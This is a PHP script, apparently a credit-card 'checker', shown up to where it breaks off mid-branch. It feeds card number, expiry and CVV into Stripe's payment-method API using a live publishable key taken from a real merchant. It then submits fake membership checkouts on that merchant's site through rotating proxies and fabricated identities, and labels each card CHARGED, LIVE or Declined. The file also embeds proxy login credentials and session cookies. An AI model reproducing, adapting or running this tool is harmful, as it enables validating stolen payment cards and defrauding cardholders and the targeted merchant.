<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$idd = 'XXXXXXXXXX';
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

$names = ['Ashish', 'John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia', 'Matthew', 'Ava', 'William'];
$last_names = ['Mishra', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Martinez'];
$streets = ['Main St', 'Oak St', 'Maple Ave', 'Pine St', 'Cedar Ln', 'Elm St', 'Springfield Dr', 'Highland Ave', 'Meadow Ln', 'Sunset Blvd'];
$cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose'];
$state_codes = ['NY', 'CA', 'TX', 'FL', 'PA', 'IL', 'OH', 'GA', 'NC', 'MI'];
$zips = ['10001', '90001', '75001', '33101', '19101', '60601', '44101', '30301', '28201', '48201'];
$name = ucfirst($names[array_rand($names)]);
$last = ucfirst($last_names[array_rand($last_names)]);
$street = rand(100, 9999).' '.$streets[array_rand($streets)];
$city = $cities[array_rand($cities)];
$state_code = $state_codes[array_rand($state_codes)];
$zip = $zips[array_rand($zips)];
$mail = strtolower($name).'.'.strtolower($last).''.rand(0000,9999).'@gmail.com';






$rotate_u_p = 'rmurniiu-rotate:ctrx5ac4zonv';//--proxy user&pass here--like 'username-rotate:password';
$rotate_url = 'https://p.webshare.io:80';//--proxy url with port here--like 'http://p.webshare.io:80';
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $rotate_url);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate_u_p);
$proxy = curl_exec($ch);
curl_close($ch);
if (isset($proxy)) {
$ip = "🟢";
}
if (empty($proxy)) {
$ip = "🔴";
}






////////////////////////////===[1 Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_PROXY, $rotate_url);//---allow only for rotation proxy---//
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate_u_p);//--allow only for rotation proxy--//
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.8',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 AlohaBrowser/0.7.2.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=38553a65-6b51-4223-9ce8-ec4ad9e06484445363&muid=659e22f8-f1f1-492f-a869-46d5b682b71d30aad3&sid=fdfb0e75-e603-49b4-88d9-e493316375555a3fc8&pasted_fields=number&payment_user_agent=stripe.js%2Ff01cf920a3%3B+stripe-js-v3%2Ff01cf920a3%3B+split-card-element&referrer=https%3A%2F%2Fwww.rebelsdiet.com&time_on_page=239670&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1HKIGdJTpsEG5afM');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

////////////////////////////===[2 Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.rebelsdiet.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.rebelsdiet.com',
'method: POST',
'path: /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'content-type: application/x-www-form-urlencoded',
'cookie: PHPSESSID=j4gd4mgtv1hhil58t715f6tafb; pmpro_visit=1; _ga=GA1.2.295470028.1721571628; _gid=GA1.2.275381361.1721571630; _fbp=fb.1.1721571630114.453996108140023046; tk_or=%22http%3A%2F%2Flocalhost%2F%22; tk_r3d=%22http%3A%2F%2Flocalhost%2F%22; tk_lr=%22http%3A%2F%2Flocalhost%2F%22; __stripe_mid=659e22f8-f1f1-492f-a869-46d5b682b71d30aad3; __stripe_sid=fdfb0e75-e603-49b4-88d9-e493316375555a3fc8; _ga_Z0VQLFNXRG=GS1.1.1721571627.1.1.1721571860.0.0.0; _gat_gtag_UA_223837019_1=1; _gali=pmpro_btn-submit',
'origin: https://www.rebelsdiet.com',
'referer: https://www.rebelsdiet.com/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 13; 22111317I Build/TKQ1.221013.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36',
   ));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=3&checkjavascript=1&other_discount_code=&username='.$name.''.$last.'&password='.$name.'12345&password2='.$name.'12345&bemail='.$mail.'&bconfirmemail='.$mail.'&fullname=&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');

$result2 = curl_exec($ch);
$token = trim(strip_tags(getStr($result2,'"id": "','"')));
$msg = trim(strip_tags(getStr($result2,'"pmpro_message pmpro_error">','</div>')));
////////////////////////////===[BIN Info]
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/*;q=0.8'
)); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['name'];
$emoji = $fim['country']['emoji'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

////////////////////////////===[Responses]

////////////////////////////////////////   CHARGED RESPONSE  //////////////////////////////////////

if
(strpos($result2,  "Thank You For Donation.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED  | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙑𝙑 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
  
}

elseif
(strpos($result2,  '"Thank You For Donation."')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙑𝙑 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
  
}

elseif
(strpos($result2,  "Thank You.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙑𝙑 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
  
}

elseif
(strpos($result2,  "Thank You. Your order has been received")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙑𝙑 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
  
}

elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙑𝙑 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
  
}

////////////////////////////////////////   #LIVE AND CCN   /////////////////////////////////////
elseif
(strpos($result2,  '"cvc_check": "pass"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙑𝙑 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
  
}

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙑𝙑 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
   
} 

elseif
(strpos($result2,  "incorrect_zip")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙑𝙑 ✅ 𝙄𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩 𝙕𝙞𝙥</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"type":"one-time"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙑𝙑 ✅ 𝙄𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩 𝙕𝙞𝙥</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
  
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝙁𝙪𝙣𝙙𝙨 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
   
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝙁𝙪𝙣𝙙𝙨 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
  
}
////////////////////////////////////////////   CCN   //////////////////////////////

elseif
(strpos($result2,  'security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝘾𝙉 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝘾𝙉 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝘾𝙉 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "THE CARD'S SECURITY CODE IS INCORRECT.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝘾𝙉 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝘾𝙉 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝘾𝙉 ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}
//////////////////////////////////////////     DEAD    /////////////////////

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙎𝙩𝙤𝙡𝙚𝙣 𝘾𝙖𝙧𝙙 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙇𝙤𝙨𝙩 𝘾𝙖𝙧𝙙 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘾𝙖𝙧𝙙 𝘿𝙤𝙚𝙨𝙣𝙩 𝙎𝙪𝙥𝙥𝙤𝙧𝙩 𝙏𝙝𝙞𝙨 𝙋𝙪𝙧𝙘𝙝𝙖𝙨𝙚 </i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
   
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙋𝙞𝙘𝙠𝙪𝙥 𝘾𝙖𝙧𝙙 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}
 
elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘾𝙖𝙧𝙙 𝙀𝙭𝙥𝙞𝙧𝙚𝙙 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙄𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩 𝘾𝙖𝙧𝙙 𝙉𝙪𝙢𝙗𝙚𝙧 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘾𝙖𝙧𝙙 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙂𝙚𝙣𝙚𝙧𝙞𝙘 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘿𝙤 𝙉𝙤𝙩 𝙃𝙤𝙣𝙤𝙧 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙀𝙭𝙥𝙞𝙧𝙚𝙙 𝘾𝙖𝙧𝙙 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙀𝙧𝙧𝙤𝙧 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙎𝙚𝙧𝙫𝙞𝙘𝙚 𝙉𝙤𝙩 𝘼𝙡𝙡𝙤𝙬𝙚𝙙 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘾𝙑𝘾 𝘾𝙝𝙚𝙘𝙠 𝙐𝙣𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘾𝙑𝘾 𝘾𝙝𝙚𝙘𝙠 𝙐𝙣𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "three_d_secure_redirect")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3𝘿 𝙎𝙚𝙘𝙪𝙧𝙚 𝙍𝙚𝙙𝙞𝙧𝙚𝙘𝙩 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'card number is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝙄𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩 𝘾𝙖𝙧𝙙 𝙉𝙪𝙢𝙗𝙚𝙧 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙: 𝙈𝙞𝙨𝙨𝙞𝙣𝙜 𝘾𝙖𝙧𝙙 𝘿𝙚𝙩𝙖𝙞𝙡𝙨 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>𝘼𝙣𝙤𝙩𝙝𝙚𝙧 𝙍𝙚𝙦𝙪𝙚𝙨𝙩 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨: 𝘾𝙖𝙧𝙙 𝙉𝙤𝙩 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
